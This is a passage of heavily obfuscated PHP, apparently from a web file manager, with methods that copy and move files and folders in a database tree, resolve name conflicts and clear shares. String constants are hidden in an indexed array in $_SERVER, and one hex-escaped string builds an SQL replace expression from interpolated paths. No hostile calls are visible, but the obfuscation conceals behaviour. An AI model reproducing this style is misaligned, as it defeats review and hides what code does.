$Ÿ€¡“‹ô); if ($›Ã‹÷£[$ÎÖØøåÂ[453]] == $ÎÖØøåÂ[88] && $Ø²Ùıªµ == $úä«¢ôæ) { $this->folderSizeResetChildren($Ø²Ùıªµ); } Model($ÎÖØøåÂ[600])->addAll($šôæç¹£[$ÎÖØøåÂ[598]], array(), !0); if ($Ø²Ùıªµ != $úä«¢ôæ || $›Ã‹÷£[$ÎÖØøåÂ[453]] == $ÎÖØøåÂ[88]) { Model($ÎÖØøåÂ[601])->eventCopy($úä«¢ôæ); } $this->saveAll($šôæç¹£[$ÎÖØøåÂ[599]]); Model($ÎÖØøåÂ[214])->linkAdd($šôæç¹£[$ÎÖØøåÂ[597]]); $this->folderSizeReset($ãÔèŠ¸Ø); $this->updateModifyTime($ãÔèŠ¸Ø); return $úä«¢ôæ; } private function _copy($‰‡•³¬ê, $µØÂí÷¶, $¾úãå‹Â, &$ñÃêÛ¼Ü, $”–ãŠ¬ß, $ÃÂÊ°¶Ç = '') { $©Ã»øå€ =& $_SERVER[çâ¥×ø³]; $ÃŞÌ›Ô’ = $this->sourceInfoCache($‰‡•³¬ê); $ô‹ÂÑáù = $ÃŞÌ›Ô’[$©Ã»øå€[453]] == $©Ã»øå€[88]; $öïÎäºÚ = $ÃÂÊ°¶Ç ? $ÃÂÊ°¶Ç : $ÃŞÌ›Ô’[$©Ã»øå€[32]]; $Ê¾Ì³ˆ¼ = $this->fileNameExistAuto($µØÂí÷¶, $ÃŞÌ›Ô’); if ($”–ãŠ¬ß) { $this->_childrenAllMake($‰‡•³¬ê); if ($ô‹ÂÑáù && $Ê¾Ì³ˆ¼) { $this->_childrenAllMake($Ê¾Ì³ˆ¼); } } if (!$Ê¾Ì³ˆ¼) { return $this->_copyCreate($‰‡•³¬ê, $µØÂí÷¶, $öïÎäºÚ, $ñÃêÛ¼Ü); } $£é¦÷õÕ = $Ê¾Ì³ˆ¼; if ($ô‹ÂÑáù) { if ($¾úãå‹Â == REPEAT_RENAME_FOLDER) { $öïÎäºÚ = $this->fileNameAutoCache($µØÂí÷¶, $öïÎäºÚ, $¾úãå‹Â, $ô‹ÂÑáù); $£é¦÷õÕ = $this->_copyCreate($‰‡•³¬ê, $µØÂí÷¶, $öïÎäºÚ, $ñÃêÛ¼Ü); } else { $¦ÅŒñ¦Ï = $this->_childrenList($‰‡•³¬ê); foreach ($¦ÅŒñ¦Ï as $¡€ŠàŠ) { $this->_copy($¡€ŠàŠ[$©Ã»øå€[181]], $Ê¾Ì³ˆ¼, $¾úãå‹Â, $ñÃêÛ¼Ü, !1); } } } else { if ($¾úãå‹Â == REPEAT_RENAME || $¾úãå‹Â == REPEAT_RENAME_FOLDER) { $öïÎäºÚ = $this->fileNameAutoCache($µØÂí÷¶, $öïÎäºÚ, $¾úãå‹Â, $ô‹ÂÑáù); $£é¦÷õÕ = $this->_copyCreate($‰‡•³¬ê, $µØÂí÷¶, $öïÎäºÚ, $ñÃêÛ¼Ü); } else { if ($¾úãå‹Â == REPEAT_REPLACE) { $İµñÜÆ€ = $this->sourceInfoCache($Ê¾Ì³ˆ¼); $‡ÇÇâ¬© = $this->fileHistory($İµñÜÆ€, $ÃŞÌ›Ô’[$©Ã»øå€[509]], $ÃŞÌ›Ô’[$©Ã»øå€[76]]); if ($‡ÇÇâ¬©) { $ñÃêÛ¼Ü[$©Ã»øå€[597]][] = $ÃŞÌ›Ô’[$©Ã»øå€[509]]; } } else { if ($¾úãå‹Â == REPEAT_SKIP) { } } } Hook::trigger($©Ã»øå€[602], array($©Ã»øå€[603], $ÃŞÌ›Ô’, 0)); } return $£é¦÷õÕ; } private function _copyCreate($½×òö‚¬, $ÆôÆÏ’, $åÒŒî, &$ÓäÚí‹Ú) { $Õ–÷Óìò =& $_SERVER[çâ¥×ø³]; $Ù­ÇñÎ = $this->sourceInfoCache($½×òö‚¬); $°Å½¼Ì‘ = $this->sourceInfoCache($ÆôÆÏ’); $ÄÆé©´ = $this->_makeItemData($Ù­ÇñÎ, $°Å½¼Ì‘, $åÒŒî); Hook::trigger($Õ–÷Óìò[604], $ÄÆé©´); Hook::trigger($Õ–÷Óìò[605], array($Õ–÷Óìò[606], $ÄÆé©´, 0)); $€è”˜ûÉ = $this->add($ÄÆé©´); $¾²«™× = array($Õ–÷Óìò[181] => $€è”˜ûÉ, $Õ–÷Óìò[32] => $åÒŒî); $this->_copyApplyMeta($¾²«™×, $ÓäÚí‹Ú); if ($Ù­ÇñÎ[$Õ–÷Óìò[453]] != $Õ–÷Óìò[88]) { $ÓäÚí‹Ú[$Õ–÷Óìò[597]][] = $Ù­ÇñÎ[$Õ–÷Óìò[509]]; return $€è”˜ûÉ; } $‡Ñ…­÷ = array(); $Õ“üâ½Œ = array(); $this->_childrenListAll($½×òö‚¬, $‡Ñ…­÷); $¦™ü§‹ = count($‡Ñ…­÷); if ($¦™ü§‹ == 0) { return $€è”˜ûÉ; } $êÊ›â¼Ë = $this->sourceInfo($€è”˜ûÉ); foreach ($‡Ñ…­÷ as $ŒÉ¡ÎÜ¯) { $î©®³ûœ = $this->_makeItemData($ŒÉ¡ÎÜ¯, $êÊ›â¼Ë, $ŒÉ¡ÎÜ¯[$Õ–÷Óìò[32]]); $î©®³ûœ[$Õ–÷Óìò[553]] = $ŒÉ¡ÎÜ¯[$Õ–÷Óìò[553]]; $Õ“üâ½Œ[] = $î©®³ûœ; } $this->chunkEventSet($Õ–÷Óìò[607], array($Õ–÷Óìò[608], $ÄÆé©´, $¦™ü§‹)); $this->addAll($Õ“üâ½Œ, array(), !1); $Å˜¯ª©æ = $this->where(array($Õ–÷Óìò[180] => $€è”˜ûÉ))->select(); $‰¬Ÿá‹‘ = $this->_childrenMakeRelation($‡Ñ…­÷, $Å˜¯ª©æ); $‰¬Ÿá‹‘[$½×òö‚¬] = $€è”˜ûÉ; $á›¸ªŠñ = array(); $°ê„”Î£ = array(); foreach ($Å˜¯ª©æ as $ŒÉ¡ÎÜ¯) { $ç¥ÆËà = $ŒÉ¡ÎÜ¯[$Õ–÷Óìò[181]]; $ÂÈ«®Ÿç = $this->_childrenMatch($‰¬Ÿá‹‘, $ŒÉ¡ÎÜ¯, $êÊ›â¼Ë); $á›¸ªŠñ[] = array($Õ–÷Óìò[181], $ç¥ÆËà, $Õ–÷Óìò[180], $ÂÈ«®Ÿç[$Õ–÷Óìò[180]]); $°ê„”Î£[] = array($Õ–÷Óìò[181], $ç¥ÆËà, $Õ–÷Óìò[553], $ÂÈ«®Ÿç[$Õ–÷Óìò[553]]); $this->_copyApplyMeta($ŒÉ¡ÎÜ¯, $ÓäÚí‹Ú); if ($ŒÉ¡ÎÜ¯[$Õ–÷Óìò[453]] != $Õ–÷Óìò[88]) { $ÓäÚí‹Ú[$Õ–÷Óìò[597]][] = $ŒÉ¡ÎÜ¯[$Õ–÷Óìò[509]]; } } $this->chunkEventSet($Õ–÷Óìò[609], array($Õ–÷Óìò[610], $ÄÆé©´, $¦™ü§‹)); $this->saveAll($á›¸ªŠñ); $this->chunkEventSet($Õ–÷Óìò[611], array($Õ–÷Óìò[612], $ÄÆé©´, $¦™ü§‹)); $this->saveAll($°ê„”Î£); return $€è”˜ûÉ; } private function _childrenMakeRelation($©Ä¥ûî³, $‰œ„åÄ) { $¤ù¶•Û¬ =& $_SERVER[çâ¥×ø³]; $õáˆ¥öâ = array(); $îÑ…÷¬Ÿ = array(); foreach ($©Ä¥ûî³ as $ñ†ñâ·Ú) { $ÒŠÚõ«Õ = $ñ†ñâ·Ú[$¤ù¶•Û¬[32]] . $¤ù¶•Û¬[8] . $ñ†ñâ·Ú[$¤ù¶•Û¬[553]]; $õáˆ¥öâ[$ÒŠÚõ«Õ] = $ñ†ñâ·Ú[$¤ù¶•Û¬[181]]; } foreach ($‰œ„åÄ as $ñ†ñâ·Ú) { $ÒŠÚõ«Õ = $ñ†ñâ·Ú[$¤ù¶•Û¬[32]] . $¤ù¶•Û¬[8] . $ñ†ñâ·Ú[$¤ù¶•Û¬[553]]; $Şëö¡Ì× = $õáˆ¥öâ[$ÒŠÚõ«Õ]; $îÑ…÷¬Ÿ[$Şëö¡Ì×] = $ñ†ñâ·Ú[$¤ù¶•Û¬[181]]; } return $îÑ…÷¬Ÿ; } private function _childrenMatch($»Àšæ‘ö, $¡ËÊÅª, $²Ç‹µ) { $š©ªÅÄ =& $_SERVER[çâ¥×ø³]; $™‡Î‘ªÌ = $²Ç‹µ[$š©ªÅÄ[553]]; $¹èş¯§ä = $this->parentLevelArray($¡ËÊÅª[$š©ªÅÄ[553]]); foreach ($¹èş¯§ä as $ëÕı›ˆÆ) { if (isset($»Àšæ‘ö[$ëÕı›ˆÆ])) { $™‡Î‘ªÌ .= $»Àšæ‘ö[$ëÕı›ˆÆ] . $š©ªÅÄ[613]; } } $™‡Î‘ªÌ = rtrim($™‡Î‘ªÌ, $š©ªÅÄ[50]) . $š©ªÅÄ[50]; $ĞÛÔÇº³ = $this->parentLevelArray($™‡Î‘ªÌ); $ßÚ¡—¡ê = $ĞÛÔÇº³[count($ĞÛÔÇº³) - 1]; return array($š©ªÅÄ[180] => $ßÚ¡—¡ê, $š©ªÅÄ[553] => $™‡Î‘ªÌ); } private function _makeItemData($î‘ıôÚ€, $ÁÖÂö¤­, $œé«§ã§) { $øÙ¶áÀŞ =& $_SERVER[çâ¥×ø³]; $†•ó—†È = array($øÙ¶áÀŞ[614] => $î‘ıôÚ€[$øÙ¶áÀŞ[453]], $øÙ¶áÀŞ[462] => $œé«§ã§, $øÙ¶áÀŞ[615] => $î‘ıôÚ€[$øÙ¶áÀŞ[454]] ? $î‘ıôÚ€[$øÙ¶áÀŞ[454]] : $øÙ¶áÀŞ[12], $øÙ¶áÀŞ[510] => $î‘ıôÚ€[$øÙ¶áÀŞ[509]] ? $î‘ıôÚ€[$øÙ¶áÀŞ[509]] : 0, $øÙ¶áÀŞ[585] => $î‘ıôÚ€[$øÙ¶áÀŞ[76]] ? $î‘ıôÚ€[$øÙ¶áÀŞ[76]] : 0, $øÙ¶áÀŞ[616] => intval($ÁÖÂö¤­[$øÙ¶áÀŞ[178]]), $øÙ¶áÀŞ[617] => intval($ÁÖÂö¤­[$øÙ¶áÀŞ[538]]), $øÙ¶áÀŞ[618] => intval(USER_ID), $øÙ¶áÀŞ[619] => intval(USER_ID), $øÙ¶áÀŞ[445] => intval($ÁÖÂö¤­[$øÙ¶áÀŞ[181]]), $øÙ¶áÀŞ[620] => $ÁÖÂö¤­[$øÙ¶áÀŞ[553]] . $ÁÖÂö¤­[$øÙ¶áÀŞ[181]] . $øÙ¶áÀŞ[50], $øÙ¶áÀŞ[466] => $î‘ıôÚ€[$øÙ¶áÀŞ[85]] ? $î‘ıôÚ€[$øÙ¶áÀŞ[85]] : time(), $øÙ¶áÀŞ[472] => 0, $øÙ¶áÀŞ[621] => $øÙ¶áÀŞ[12]); return $†•ó—†È; } private function _copyApplyMeta($¢È´•ü, &$Æâª¡Ùª) { $¥ßÉò«ä =& $_SERVER[çâ¥×ø³]; $’…æêÂ = $¢È´•ü[$¥ßÉò«ä[181]]; $„ößàûÔ = $¢È´•ü[$¥ßÉò«ä[32]]; if (!isset($¢È´•ü[$¥ßÉò«ä[622]]) || !$¢È´•ü[$¥ßÉò«ä[622]] || $¢È´•ü[$¥ßÉò«ä[622]] == $¥ßÉò«ä[212]) { $Æâª¡Ùª[$¥ßÉò«ä[599]][] = array($¥ßÉò«ä[181], $’…æêÂ, $¥ßÉò«ä[622], short_id($’…æêÂ)); } if (Input::check($„ößàûÔ, $¥ßÉò«ä[623])) { $Æâª¡Ùª[$¥ßÉò«ä[598]][] = array($¥ßÉò«ä[181] => $’…æêÂ, $¥ßÉò«ä[94] => $¥ßÉò«ä[506], $¥ßÉò«ä[418] => str_replace($¥ßÉò«ä[53], $¥ßÉò«ä[12], Pinyin::get($„ößàûÔ))); $Æâª¡Ùª[$¥ßÉò«ä[598]][] = array($¥ßÉò«ä[181] => $’…æêÂ, $¥ßÉò«ä[94] => $¥ßÉò«ä[505], $¥ßÉò«ä[418] => Pinyin::get($„ößàûÔ, $¥ßÉò«ä[624])); } $Æâª¡Ùª[$¥ßÉò«ä[598]][] = array($¥ßÉò«ä[181] => $’…æêÂ, $¥ßÉò«ä[94] => $¥ßÉò«ä[485], $¥ßÉò«ä[418] => KodSort::makeStr($„ößàûÔ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Á«®Ñ¹) { $ÒƒÖ«½· =& $_SERVER[çâ¥×ø³]; $ˆĞ¿ƒ´ª = $this->sourceInfo($Á«®Ñ¹); $¼‡¢ˆÚ = $ÒƒÖ«½·[625]; $³Œ›•ğº = array($ÒƒÖ«½·[553] => array($ÒƒÖ«½·[580], $ˆĞ¿ƒ´ª[$ÒƒÖ«½·[553]] . $Á«®Ñ¹ . $ÒƒÖ«½·[581]), $ÒƒÖ«½·[473] => $this->targetIsDelete); $½€í«ê½ = $this->field($¼‡¢ˆÚ)->where($³Œ›•ğº)->select(); if (!$½€í«ê½) { return; } $½€í«ê½ = array_to_keyvalue($½€í«ê½, $ÒƒÖ«½·[181]); foreach ($½€í«ê½ as $êÓ¶Ú–) { $Ş÷ ½•¨ = $êÓ¶Ú–[$ÒƒÖ«½·[180]]; $Á«®Ñ¹ = $êÓ¶Ú–[$ÒƒÖ«½·[181]]; if (!isset($this->_childrenListCache[$Á«®Ñ¹]) && $êÓ¶Ú–[$ÒƒÖ«½·[453]] == $ÒƒÖ«½·[88]) { $this->_childrenListCache[$Á«®Ñ¹] = array(); } if (!isset($this->_childrenListCache[$Ş÷ ½•¨])) { $this->_childrenListCache[$Ş÷ ½•¨] = array(); } $this->_childrenListCache[$Ş÷ ½•¨][$Á«®Ñ¹] = $êÓ¶Ú–; $this->_childrenItemCache[$Á«®Ñ¹] = $êÓ¶Ú–; } } private function _childrenListAll($›ÁÅ¥°, &$¼çç±¢) { $µÅìòà =& $_SERVER[çâ¥×ø³]; if (!isset($this->_childrenListCache[$›ÁÅ¥°])) { return; } $ä‰·á²Â = $this->_childrenListCache[$›ÁÅ¥°]; foreach ($ä‰·á²Â as $Ó‚É†Óğ => $ßİËª»á) { $¼çç±¢[$Ó‚É†Óğ] = $ßİËª»á; if ($ßİËª»á[$µÅìòà[453]] == $µÅìòà[88]) { $this->_childrenListAll($Ó‚É†Óğ, $¼çç±¢); } } } private function sourceInfoCache($û³¬ÇÖ) { if (isset($this->_childrenItemCache[$û³¬ÇÖ])) { return $this->_childrenItemCache[$û³¬ÇÖ]; } return $this->sourceInfo($û³¬ÇÖ); } private function _childrenList($ÇÉÇ¢é) { if (isset($this->_childrenListCache[$ÇÉÇ¢é])) { return $this->_childrenListCache[$ÇÉÇ¢é]; } return $this->_childrenListSelect($ÇÉÇ¢é); } private function _childrenListSelect($Ñ×¸Øæ) { $”‹‚£Ü =& $_SERVER[çâ¥×ø³]; $¦ÒÑŠ‘Á = array($”‹‚£Ü[180] => $Ñ×¸Øæ, $”‹‚£Ü[473] => $this->targetIsDelete); $é™òƒüÍ = $this->where($¦ÒÑŠ‘Á)->select(); $é™òƒüÍ = $é™òƒüÍ ? $é™òƒüÍ : array(); $Âİøé¦É = array_to_keyvalue($é™òƒüÍ, $”‹‚£Ü[181]); $this->_childrenListCache[$Ñ×¸Øæ] = $Âİøé¦É; foreach ($Âİøé¦É as $Ñ×¸Øæ => $„Š£ú) { $this->_childrenItemCache[$Ñ×¸Øæ] = $„Š£ú; } return $Âİøé¦É; } private function fileNameExistAuto($ˆëß©´³, $Õ•¿Õ‡í) { $Ü¬‡Ÿ÷§ =& $_SERVER[çâ¥×ø³]; if ($Õ•¿Õ‡í[$Ü¬‡Ÿ÷§[473]] == $Ü¬‡Ÿ÷§[88]) { return $this->fileNameExist($ˆëß©´³, $Õ•¿Õ‡í[$Ü¬‡Ÿ÷§[32]]); } return $this->fileNameExistCache($ˆëß©´³, $Õ•¿Õ‡í[$Ü¬‡Ÿ÷§[32]]); } private function fileNameExistCache($éõ³±Ì£, $’È­¦ëë) { $ò¬É¥ğ =& $_SERVER[çâ¥×ø³]; $’È­¦ëë = strtolower($’È­¦ëë); $Äòé…á = $this->_childrenList($éõ³±Ì£); foreach ($Äòé…á as $ÍÌ¦²Ø) { if ($’È­¦ëë == strtolower($ÍÌ¦²Ø[$ò¬É¥ğ[32]])) { return $ÍÌ¦²Ø[$ò¬É¥ğ[181]]; } } return !1; } private function fileNameAutoCache($’å¨ºÅ», $æÃêÆîÊ, $¸Ä“å£ , $†‘İÓ¬Ä) { $ˆÃ„šÀõ =& $_SERVER[çâ¥×ø³]; $º¶ıÉ“ğ = $this->_childrenList($’å¨ºÅ»); $è´Û‰¥‘ = array_to_keyvalue($º¶ıÉ“ğ, $ˆÃ„šÀõ[12], $ˆÃ„šÀõ[32]); return $this->fileNameAutoGet($è´Û‰¥‘, $æÃêÆîÊ, $¸Ä“å£ , $†‘İÓ¬Ä); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($±È¢³Õ, $«Š‚ ÍÎ, $è˜äç°Ÿ = REPEAT_REPLACE, $Å‚‰úºú = '') { $¿ÏÇ®Ÿ =& $_SERVER[çâ¥×ø³]; $âß€²Ú¼ = $this->sourceInfo($±È¢³Õ); $ÓºÍÛ£· = $this->sourceInfo($«Š‚ ÍÎ); if ($âß€²Ú¼[$¿ÏÇ®Ÿ[180]] == $ÓºÍÛ£·[$¿ÏÇ®Ÿ[181]]) { if ($âß€²Ú¼[$¿ÏÇ®Ÿ[473]] == $¿ÏÇ®Ÿ[88]) { Model($¿ÏÇ®Ÿ[471])->restore(array($±È¢³Õ)); } if (!$Å‚‰úºú || $Å‚‰úºú == $âß€²Ú¼[$¿ÏÇ®Ÿ[32]]) { return $±È¢³Õ; } } $Ñö¸¡”ö = $this->pathInfoMore($±È¢³Õ); if ($this->isParentOf($±È¢³Õ, $«Š‚ ÍÎ)) { return !1; } if (!$âß€²Ú¼ || !$ÓºÍÛ£· || $ÓºÍÛ£·[$¿ÏÇ®Ÿ[453]] != $¿ÏÇ®Ÿ[88]) { return !1; } Hook::trigger($¿ÏÇ®Ÿ[626], $Ñö¸¡”ö); $this->targetIsDelete = intval($âß€²Ú¼[$¿ÏÇ®Ÿ[473]]); if ($âß€²Ú¼[$¿ÏÇ®Ÿ[180]] == $«Š‚ ÍÎ && $Å‚‰úºú != $âß€²Ú¼[$¿ÏÇ®Ÿ[32]]) { $‚ĞÖòÑâ = $this->fileNameExist($«Š‚ ÍÎ, $Å‚‰úºú); if ($‚ĞÖòÑâ && $âß€²Ú¼[$¿ÏÇ®Ÿ[453]] == $¿ÏÇ®Ÿ[212]) { $ÍíÓÅ‹É = $this->sourceInfo($‚ĞÖòÑâ); $ôª½šƒ› = $this->fileHistory($ÍíÓÅ‹É, $âß€²Ú¼[$¿ÏÇ®Ÿ[509]], $âß€²Ú¼[$¿ÏÇ®Ÿ[76]]); if (!$ôª½šƒ›) { Model($¿ÏÇ®Ÿ[512])->remove($âß€²Ú¼[$¿ÏÇ®Ÿ[509]]); } $this->removeNow($±È¢³Õ, !1); $this->folderSizeReset($«Š‚ ÍÎ); Hook::trigger($¿ÏÇ®Ÿ[627], $Ñö¸¡”ö); return $‚ĞÖòÑâ; } } $µŒ³íÇ× = $Å‚‰úºú ? $Å‚‰úºú : $âß€²Ú¼[$¿ÏÇ®Ÿ[32]]; $this->lockMoveStart($±È¢³Õ); $this->lockWriteStart($«Š‚ ÍÎ, $µŒ³íÇ×); $«­°©ìï = array($¿ÏÇ®Ÿ[597] => array(), $¿ÏÇ®Ÿ[628] => !1); $this->clearShare($±È¢³Õ, $«Š‚ ÍÎ); $öê‘ùÏ¥ = $this->fileNameExistAuto($«Š‚ ÍÎ, $âß€²Ú¼); $ç–œ¹‹î = $this->_move($±È¢³Õ, $«Š‚ ÍÎ, $è˜äç°Ÿ, $«­°©ìï, $Å‚‰úºú); $this->sourceCacheClear(); if ($âß€²Ú¼[$¿ÏÇ®Ÿ[453]] == $¿ÏÇ®Ÿ[88] && $öê‘ùÏ¥) { $this->folderSizeResetChildren($ç–œ¹‹î); } Model($¿ÏÇ®Ÿ[214])->linkAdd($«­°©ìï[$¿ÏÇ®Ÿ[597]]); if ($öê‘ùÏ¥ && $«­°©ìï[$¿ÏÇ®Ÿ[628]]) { $this->removeNow($±È¢³Õ, !1); } $this->lockMoveEnd($±È¢³Õ); $this->lockWriteEnd($«Š‚ ÍÎ, $µŒ³íÇ×); $this->folderSizeReset($âß€²Ú¼[$¿ÏÇ®Ÿ[180]]); $this->folderSizeReset($«Š‚ ÍÎ); $·…¬Ô¨º = array($âß€²Ú¼[$¿ÏÇ®Ÿ[180]], $«Š‚ ÍÎ); if ($âß€²Ú¼[$¿ÏÇ®Ÿ[453]] == $¿ÏÇ®Ÿ[88]) { $·…¬Ô¨º[] = $±È¢³Õ; } $this->updateModifyTime($·…¬Ô¨º); Model($¿ÏÇ®Ÿ[601])->eventMove($±È¢³Õ, $âß€²Ú¼[$¿ÏÇ®Ÿ[180]], $«Š‚ ÍÎ); Hook::trigger($¿ÏÇ®Ÿ[627], $Ñö¸¡”ö); return $ç–œ¹‹î; } private function _move($ÑÙÉÁ°À, $“‚ßøƒ, $Îº¹‚æ¿, &$‚®Ï­…µ, $á¯İó‰ = '') { $·‚‰ªÒô =& $_SERVER[çâ¥×ø³]; $Ö“ÍˆÈ = $this->sourceInfo($ÑÙÉÁ°À); $Ê†ÔæŸ = $Ö“ÍˆÈ[$·‚‰ªÒô[453]] == $·‚‰ªÒô[88]; $ƒõÉãøç = $á¯İó‰ ? $á¯İó‰ : $Ö“ÍˆÈ[$·‚‰ªÒô[32]]; $š±˜‡ÃÙ = $this->fileNameExistAuto($“‚ßøƒ, $Ö“ÍˆÈ); $this->lockMoveStart($ÑÙÉÁ°À); $this->lockWriteStart($“‚ßøƒ, $ƒõÉãøç); if (!$š±˜‡ÃÙ) { return $this->_moveForce($ÑÙÉÁ°À, $“‚ßøƒ, $ƒõÉãøç); } $¥øŒı©ü = $š±˜‡ÃÙ; $îÉ©‘ë = !1; if ($Ê†ÔæŸ) { if ($Îº¹‚æ¿ == REPEAT_RENAME_FOLDER) { $ƒõÉãøç = $this->fileNameAuto($“‚ßøƒ, $ƒõÉãøç, $Îº¹‚æ¿, $Ê†ÔæŸ); $¥øŒı©ü = $this->_moveForce($ÑÙÉÁ°À, $“‚ßøƒ, $ƒõÉãøç); } else { if ($Îº¹‚æ¿ == REPEAT_RENAME_FOLDER) { $Îº¹‚æ¿ = REPEAT_RENAME; } $¢ŸÁôÅÉ = $this->_childrenListSelect($ÑÙÉÁ°À); foreach ($¢ŸÁôÅÉ as $üÂ’ô¿Ü) { $this->_move($üÂ’ô¿Ü[$·‚‰ªÒô[181]], $š±˜‡ÃÙ, $Îº¹‚æ¿, $‚®Ï­…µ); } $îÉ©‘ë = !0; } } else { if ($Îº¹‚æ¿ == REPEAT_SKIP) { $îÉ©‘ë = !0; } else { if ($Îº¹‚æ¿ == REPEAT_RENAME || $Îº¹‚æ¿ == REPEAT_RENAME_FOLDER) { $ƒõÉãøç = $this->fileNameAuto($“‚ßøƒ, $ƒõÉãøç, $Îº¹‚æ¿, $Ê†ÔæŸ); $¥øŒı©ü = $this->_moveForce($ÑÙÉÁ°À, $“‚ßøƒ, $ƒõÉãøç); } else { if ($Îº¹‚æ¿ == REPEAT_REPLACE) { $Ô³²àß = $this->sourceInfoCache($š±˜‡ÃÙ); $Ãö¸²Ÿ‹ = $this->fileHistory($Ô³²àß, $Ö“ÍˆÈ[$·‚‰ªÒô[509]], $Ö“ÍˆÈ[$·‚‰ªÒô[76]]); $îÉ©‘ë = !0; if ($Ãö¸²Ÿ‹) { $‚®Ï­…µ[$·‚‰ªÒô[597]][] = $Ö“ÍˆÈ[$·‚‰ªÒô[509]]; } } } } } if ($îÉ©‘ë && !$‚®Ï­…µ[$·‚‰ªÒô[628]]) { $‚®Ï­…µ[$·‚‰ªÒô[628]] = !0; } return $¥øŒı©ü; } private function _moveForce($áŸêº†, $ÍøòïıÉ, $½¿ùù§) { $ÌÙ®ÂŸ„ =& $_SERVER[çâ¥×ø³]; $Çªê¥ùŞ = $this->sourceInfo($áŸêº†); $Ÿ‘‹½÷ó = $this->sourceInfo($ÍøòïıÉ); $ûë˜¿ˆ„ = $Çªê¥ùŞ[$ÌÙ®ÂŸ„[453]] == $ÌÙ®ÂŸ„[88]; $±öúÅî† = array($ÌÙ®ÂŸ„[445] => $Ÿ‘‹½÷ó[$ÌÙ®ÂŸ„[181]], $ÌÙ®ÂŸ„[620] => $Ÿ‘‹½÷ó[$ÌÙ®ÂŸ„[553]] . $Ÿ‘‹½÷ó[$ÌÙ®ÂŸ„[181]] . $ÌÙ®ÂŸ„[50], $ÌÙ®ÂŸ„[616] => $Ÿ‘‹½÷ó[$ÌÙ®ÂŸ„[178]], $ÌÙ®ÂŸ„[617] => $Ÿ‘‹½÷ó[$ÌÙ®ÂŸ„[538]], $ÌÙ®ÂŸ„[619] => USER_ID, $ÌÙ®ÂŸ„[462] => $½¿ùù§); $ì‰´œ¼ = $Çªê¥ùŞ[$ÌÙ®ÂŸ„[178]] == SourceModel::TYPE_GROUP && $Ÿ‘‹½÷ó[$ÌÙ®ÂŸ„[178]] == SourceModel::TYPE_GROUP && $Çªê¥ùŞ[$ÌÙ®ÂŸ„[538]] == $Ÿ‘‹½÷ó[$ÌÙ®ÂŸ„[538]]; if (!$ì‰´œ¼ && $this->moveClearAuth) { Model($ÌÙ®ÂŸ„[535])->authClear($áŸêº†); } $ï»ô‰®ñ = $Çªê¥ùŞ[$ÌÙ®ÂŸ„[473]] == $ÌÙ®ÂŸ„[88] && $Ÿ‘‹½÷ó[$ÌÙ®ÂŸ„[473]] != $ÌÙ®ÂŸ„[88]; if ($ï»ô‰®ñ) { $±öúÅî†[$ÌÙ®ÂŸ„[472]] = 0; } if ($ûë˜¿ˆ„) { $æš†ß = array($ÌÙ®ÂŸ„[620] => array($ÌÙ®ÂŸ„[580], $Çªê¥ùŞ[$ÌÙ®ÂŸ„[553]] . $Çªê¥ùŞ[$ÌÙ®ÂŸ„[181]] . $ÌÙ®ÂŸ„[581])); $Ò‰ş“ı = $Çªê¥ùŞ[$ÌÙ®ÂŸ„[553]] . $Çªê¥ùŞ[$ÌÙ®ÂŸ„[181]] . $ÌÙ®ÂŸ„[50]; $ĞıÌÂ©ô = $Ÿ‘‹½÷ó[$ÌÙ®ÂŸ„[553]] . $Ÿ‘‹½÷ó[$ÌÙ®ÂŸ„[181]] . $ÌÙ®ÂŸ„[50] . $Çªê¥ùŞ[$ÌÙ®ÂŸ„[181]] . $ÌÙ®ÂŸ„[50]; $şá´•©› = array($ÌÙ®ÂŸ„[620] => array($ÌÙ®ÂŸ„[629], "\162\145\160\154\x61\x63\145\x28\160\x61\x72\145\156\164\114\x65\x76\x65\154\54\x27{$Ò‰ş“ı}\47\x2c\x27{$ĞıÌÂ©ô}\47\51"), $ÌÙ®ÂŸ„[616] => $Ÿ‘‹½÷ó[$ÌÙ®ÂŸ„[178]], $ÌÙ®ÂŸ„[617] => $Ÿ‘‹½÷ó[$ÌÙ®ÂŸ„[538]]); if ($ï»ô‰®ñ) { $şá´•©›[$ÌÙ®ÂŸ„[472]] = 0; } $this->where($æš†ß)->data($şá´•©›)->save(); } $this->where(array($ÌÙ®ÂŸ„[459] => $áŸêº†))->data($±öúÅî†)->save(); return $áŸêº†; } private function clearShare($„ğ¸÷ÇÃ, $‚›Ú¢Éß) { $çÎ½õ» =& $_SERVER[çâ¥×ø³]; $¥‰±¶ËÙ = $this->sourceInfo($„ğ¸÷ÇÃ); $Ãíî¸á = $this->sourceInfo($‚›Ú¢Éß); if ($¥‰±¶ËÙ[$çÎ½õ»[538]] == $Ãíî¸á[$çÎ½õ»[538]] && $¥‰±¶ËÙ[$çÎ½õ»[178]] == $çÎ½õ»[630]) { return; } $Æ©çï¹ª = array($çÎ½õ»[553] => array($çÎ½õ»[580], $¥‰±¶ËÙ[$çÎ½õ»[553]] . $„ğ¸÷ÇÃ . $çÎ½õ»[581])); $şØÑğáé = $this->field($çÎ½õ»[459])->where($Æ©çï¹ª)->getField($çÎ½õ»[181], !0); if (!$şØÑğáé) { return; } $Æ©çï¹ª = array($çÎ½õ»[181] => array($çÎ½õ»[7], $şØÑğáé), $çÎ½õ»[631] => 1); $¹°‘Ìº… = Model($çÎ½õ»[632])->field($çÎ½õ»[633])->where($Æ©çï¹ª)->select(); if (!$¹°‘Ìº…) { return; } $¹°‘Ìº… = array_to_keyvalue($¹°‘Ìº…, $çÎ½õ»[12], $çÎ½õ»[633]); $Æ©çï¹ª = array($çÎ½õ»[633] => array($çÎ½õ»[7], $¹°‘Ìº…)); Model($çÎ½õ»[632])->where($Æ©çï¹ª)->save(array($çÎ½õ»[631] => 0)); Model($çÎ½õ»[634])->where($Æ©çï¹ª)->delete(); } public function copyFolderFromIO($Ş¾‰…™›, $´˜øó¿î, $¢ïĞèù, $¹¶ã‰ò’, $ÛùÌÅ´ô, $´íÌ—Ï = false) { $òÛÃ¤Üó =& $_SERVER[çâ¥×ø³]; $œÎ‡Ëî = array($òÛÃ¤Üó[598] => array(), $òÛÃ¤Üó[599] => array(), $òÛÃ¤Üó[597] => array(), $òÛÃ¤Üó[635] => array()); $Ÿ ĞóÌ = $´íÌ—Ï ? $´íÌ—Ï : $Ş¾‰…™›->pathThis($´˜øó¿î); $ıÜ—Æ£ì = $this->fileNameExist($¢ïĞèù, $Ÿ ĞóÌ); $—«»‚Î = $this->mkdir($¢ïĞèù, 